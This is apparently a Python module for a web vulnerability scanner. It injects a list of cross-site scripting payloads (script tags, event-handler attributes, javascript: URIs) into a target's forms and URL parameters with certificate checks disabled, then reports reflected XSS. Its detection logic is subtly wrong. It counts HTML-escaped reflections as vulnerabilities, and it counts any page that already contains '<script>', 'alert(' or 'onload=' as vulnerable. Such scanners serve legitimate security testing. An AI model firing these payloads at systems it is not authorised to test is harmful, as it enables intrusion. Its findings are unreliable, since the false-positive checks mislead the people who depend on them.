import requests
import re
import html
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Any, Optional


class XSSScanner:
    """Cross-Site Scripting (XSS) vulnerability scanner."""
    
    def __init__(self, config, logger):
        self.config = config.get('xss', {})
        self.logger = logger
        self.reflection_patterns = self.config.get('reflection_patterns', [])
        
    def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan target for XSS vulnerabilities."""
        vulnerabilities = []
        
        # XSS payloads - various types of XSS attacks
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            '"><script>alert("XSS")</script>',
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>"
        ]
        
        # Test forms for XSS
        forms = recon_data.get('forms', [])
        for form in forms:
            for payload in xss_payloads:
                vuln = self._test_form_xss(target, form, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    break  # Found XSS in this form, move to next
        
        # Test URL parameters for reflected XSS
        if '?' in target:
            for payload in xss_payloads:
                vuln = self._test_url_xss(target, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    break  # Found XSS in URL, move on
        
        return vulnerabilities
    
    def _test_form_xss(self, target: str, form: Dict[str, Any], payload: str) -> Optional[Dict[str, Any]]:
        """Test form for XSS vulnerabilities - REAL IMPLEMENTATION."""
        try:
            form_url = form.get('action', target)
            if not form_url.startswith(('http://', 'https://')):
                form_url = urljoin(target, form_url)
            
            # Prepare form data with XSS payload
            form_data = {}
            tested_field = None
            for input_field in form.get('inputs', []):
                field_name = input_field.get('name', '')
                field_type = input_field.get('type', 'text')
                
                if field_name and field_type not in ['hidden', 'submit', 'button']:
                    form_data[field_name] = payload
                    tested_field = field_name
                elif field_name:
                    # Use default values for other fields
                    form_data[field_name] = input_field.get('value', '')
            
            if not form_data:
                return None
            
            self.logger.debug(f"Testing XSS on form: {form_url} with payload: {payload[:30]}...")
            
            # Send request with payload
            method = form.get('method', 'GET').upper()
            if method == 'POST':
                response = requests.post(form_url, data=form_data, timeout=10, verify=False)
            else:
                response = requests.get(form_url, params=form_data, timeout=10, verify=False)
            
            # Check if payload is reflected in response
            if self._check_xss_reflection(payload, response.text):
                return {
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'high',
                    'url': form_url,
                    'parameter': tested_field,
                    'payload': payload,
                    'description': f'Reflected XSS vulnerability detected in form field "{tested_field}"',
                    'evidence': f'XSS payload reflected in response: {payload}',
                    'remediation': 'Implement proper input validation and output encoding',
                    'http_method': method,
                    'response_length': len(response.text)
                }
                
        except Exception as e:
            self.logger.error(f"Error testing form XSS: {str(e)}")
        
        return None
    
    def _test_url_xss(self, target: str, payload: str) -> Optional[Dict[str, Any]]:
        """Test URL parameters for reflected XSS - REAL IMPLEMENTATION."""
        try:
            parsed_url = urlparse(target)
            params = parse_qs(parsed_url.query)
            
            if not params:
                return None
            
            # Test each parameter
            for param_name, param_values in params.items():
                if not param_values:
                    continue
                
                # Create test URL with XSS payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # Reconstruct URL with malicious parameter
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                param_string = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                if param_string:
                    test_url += f"?{param_string}"
                
                self.logger.debug(f"Testing XSS on URL: {test_url[:100]}...")
                
                # Send request
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check if payload is reflected in response
                if self._check_xss_reflection(payload, response.text):
                    return {
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'high',
                        'url': target,
                        'parameter': param_name,
                        'payload': payload,
                        'description': f'Reflected XSS vulnerability detected in URL parameter "{param_name}"',
                        'evidence': f'XSS payload reflected in response: {payload}',
                        'remediation': 'Implement proper input validation and output encoding',
                        'vulnerable_url': test_url,
                        'response_length': len(response.text)
                    }
                    
        except Exception as e:
            self.logger.error(f"Error testing URL XSS: {str(e)}")
        
        return None
    
    def _check_xss_reflection(self, payload: str, response_text: str) -> bool:
        """Check if XSS payload is reflected in the response."""
        # Convert to lowercase for case-insensitive matching
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        # Direct reflection check
        if payload_lower in response_lower:
            return True
        
        # Check for HTML-encoded versions
        encoded_payload = html.escape(payload).lower()
        if encoded_payload != payload_lower and encoded_payload in response_lower:
            return True
        
        # Check for URL-encoded versions
        import urllib.parse
        url_encoded_payload = urllib.parse.quote(payload).lower()
        if url_encoded_payload != payload_lower and url_encoded_payload in response_lower:
            return True
        
        # Check for partial reflection (script tags)
        if '<script>' in payload_lower and '<script>' in response_lower:
            return True
        
        if 'alert(' in payload_lower and 'alert(' in response_lower:
            return True
        
        if 'onerror=' in payload_lower and 'onerror=' in response_lower:
            return True
            
        if 'onload=' in payload_lower and 'onload=' in response_lower:
            return True
        
        return False

